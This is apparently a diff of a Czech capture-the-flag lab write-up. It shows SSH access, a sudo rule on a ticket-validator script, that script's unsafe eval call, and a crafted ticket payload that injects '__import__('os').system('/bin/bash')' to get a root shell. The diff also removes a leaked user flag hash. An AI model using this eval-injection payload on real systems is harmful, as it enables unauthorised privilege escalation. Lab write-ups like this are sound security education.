@@ -121,21 +121,6 @@ Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabi
 ```bash
 ssh development@10.10.11.100
 ```
-```
-
-## cat user.txt
-__CENSORED__
-
-## sudo -l
-    (root) NOPASSWD: __CENSORED__ /opt/skytrain_inc/ticketValidator.py
-
-## /opt/skytrain_inc/ticketValidator.py
-                validationNumber = eval(x.replace("**", ""))
-
-## cp /opt/skytrain_inc/invalid_tickets/390681613.md /tmp/shell.md
-
-## /tmp/shell.md
-```
 
 ### Získání user flagu
 
@@ -145,12 +130,19 @@ Následující úsek zachycuje přechod k uživatelskému přístupu a jeho ově
 
 ```text
 ssh development@10.10.11.100
-
-## cat user.txt
-bfc34783c9aa2ee9fc1f3e12010fa8c6
-
-## sudo -l
+cat user.txt
+__CENSORED__
+sudo -l
     (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+```
+
+Zásadní byla i implementace validátoru:
+```python
+validationNumber = eval(x.replace("**", ""))
+```
+
+```bash
+cp /opt/skytrain_inc/invalid_tickets/390681613.md /tmp/shell.md
 ```
 
 ## Eskalace oprávnění
@@ -161,19 +153,19 @@ Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění 
 ```text
 Skytrain Inc
 ```
-```
 
-## Ticket to New Haven
+Do ticketu pak stačilo vložit payload zneužívající `eval`:
+```text
+Ticket to New Haven
 __Ticket Code:__
 **102+ 10 == 112 and __import__('os').system('/bin/bash') == False
 ##Issued: 2021/04/06
 #End Ticket
+```
 
-## sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
-/tmp/shell.md
-
-### cat root.txt
-__CENSORED__
+```bash
+sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py /tmp/shell.md
+cat /root/root.txt
 ```
 
 ## Shrnutí klíčových poznatků
